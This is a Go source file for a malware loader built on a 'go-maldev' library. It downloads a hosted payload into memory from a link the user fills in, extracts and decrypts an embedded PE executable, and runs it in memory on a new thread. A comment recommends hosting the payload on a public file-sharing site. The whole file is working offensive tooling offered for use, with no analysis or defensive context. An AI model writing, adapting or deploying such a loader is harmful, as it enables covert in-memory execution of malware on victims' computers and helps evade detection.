package main

import (
	"fmt"
	"runtime/debug"
	"github.com/carved4/go-maldev/pkg/decrypt"
	"github.com/carved4/go-maldev/pkg/extract"
	"github.com/carved4/go-maldev/pkg/pe"
	"github.com/carved4/go-maldev/pkg/net"
)


func main() {
	debug.SetGCPercent(-1)
	// replace with hosted payload created by generator.go, you can host this on 
	// any site with a valid SSL, I like https://uguu.se/ 
	payload, err := net.DownloadToMemory("<your link here>")
	if err != nil {
		fmt.Printf("[-] failed to download payload: %v\n", err)
		return
	}
	fmt.Printf("[+] downloaded payload: %d bytes\n", len(payload))
	
	extracted, err := extract.ExtractPEFromBytes(payload)
	if err != nil {
		fmt.Printf("[=] failed to extract PE from bytes: %v\n", err)
		return
	}
	fmt.Printf("[+] extracted PE: %d bytes\n", len(extracted))
	payload, err = decrypt.Decrypt(extracted)
	if err != nil {
		fmt.Println("[-] failed to decrypt payload")
		return
	}
	fmt.Printf("[+] decrypted PE: %d bytes\n", len(payload))
	pe.LoadPEFromBytesWithThread(payload)
}